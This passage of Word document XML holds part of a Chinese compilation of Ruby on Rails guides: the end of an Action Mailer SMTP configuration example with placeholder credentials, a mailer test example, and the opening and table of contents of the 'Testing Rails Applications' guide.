                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">            </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; '&lt;username&gt;',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F02E6C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:password</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">             </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; '&lt;password&gt;',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D5BBE9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:authentication</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">       </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'plain',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43AAF14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:enable_starttls_auto</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="19DD2FC7"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6 Mailer 测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557E94D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默认情况下， Action Mailer并不在测试环境中发送电子邮件。 他们只是将邮件添加到 ActionMailer :: Base.deliveries 队列中去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742215F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测试寄件人通常考虑两件事情：一个是该邮件被送入发送队列，一个是保证电子邮件是正确的。 考虑到这一点，我们可以像这样测试我们的邮件：</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79E70C49" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5AB16E3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UserMailerTest &lt; ActionMailer::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63DED4F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test_welcome_email</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="769D6B3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user = users(:some_user_in_your_fixtures)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1026E22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3EBE4BB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Send the email, then test that it got queued</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="256C17C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email = UserMailer.welcome_email(user).deliver</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EDA0FA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assert !ActionMailer::Base.deliveries.empty?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E966C8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7BCD629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Test the body of the sent email contains what we expect it to</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="114CDB0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assert_equal [user.email], email.to</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C7B8C2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assert_equal "Welcome to My Awesome Site", email.subject</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3ABCDAF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assert_match(/&lt;h1&gt;Welcome to example.com, #{user.name}&lt;\/h1&gt;/, email.encoded)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A28CF9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assert_match(/Welcome to example.com, #{user.name}/, email.encoded)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AB0542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299951E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2FCF4DC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在测试中，我们发送并保存返回的邮件对象。然后，我们确保它被送出（第一个断言），然后，在第二个断言中，我们确保该电子邮件确实包含我们所期望的邮件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE76525" w14:textId="449E7BE6" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.4、</w:t>
      </w:r>
      <w:hyperlink r:id="rId611" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Testing Rails Applications</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E200978" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This guide covers built-in mechanisms offered by Rails to test your application. By referring to this guide, you will be able to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E180FF1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="308"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Understand Rails testing terminology</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C28781A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="308"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Write unit, functional and integration tests for your application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77945855" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="308"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Identify other popular testing approaches and plugins</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110D9B62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This guide won’t teach you to write a Rails application; it assumes basic familiarity with the Rails way of doing things.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520EC4A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="610AF27A" wp14:editId="7C052F13">
            <wp:extent cx="323850" cy="304800"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="22" name="图片 17" descr="http://guides.ruby-china.org/images/chapters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guides.ruby-china.org/images/chapters_icon.gif"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId612" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="323850" cy="304800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B9B5ADE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId613" w:anchor="1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Why Write Tests for your Rails Applications?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="31F9B776" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId614" w:anchor="2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Introduction to Testing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="54000847" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId615" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>The Three Environments</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="204A608A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId616" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rails Sets up for Testing from the Word Go</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="60665251" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId617" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>The Low-Down on Fixtures</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5070D281" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId618" w:anchor="3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Unit Testing your Models</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="134879FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId619" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Preparing your Application for Testing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E7C40DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId620" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Running Tests</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5FD13E57" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId621" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>What to Include in Your Unit Tests</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="79518A8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId622" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Assertions Available</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="483D92EC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId623" w:anchor="3-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rails Specific Assertions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7D3A550D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId624" w:anchor="4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Functional Tests for Your Controllers</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="41DDD473" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId625" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>What to Include in your Functional Tests</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="762C1C03" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId626" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Available Request Types for Functional Tests</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="153B8FEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId627" w:anchor="4-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>The Four Hashes of the Apocalypse</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="290D8C95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId628" w:anchor="4-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Instance Variables Available</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="07D6F1EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId629" w:anchor="4-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>A Fuller Functional Test Example</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5C0B8A47" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId630" w:anchor="4-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Testing Views</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="41C4B1B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId631" w:anchor="5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Integration Testing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="31E19C5B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId632" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Helpers Available for Integration Tests</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="37382CB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId633" w:anchor="5-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Integration Testing Examples</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="01186AA3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId634" w:anchor="6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rake Tasks for Running your Tests</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="20BF8FE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId635" w:anchor="7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Brief Note About </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Test::Unit</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6FFFB26F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId636" w:anchor="8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Setup and Teardown</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F6D2FCB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId637" w:anchor="9" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Testing Routes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5ACF4A59" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId638" w:anchor="10" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Testing Your Mailers</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5D641CBC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId639" w:anchor="10-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Keeping the Postman in Check</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="64AF416B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId640" w:anchor="10-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Unit Testing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
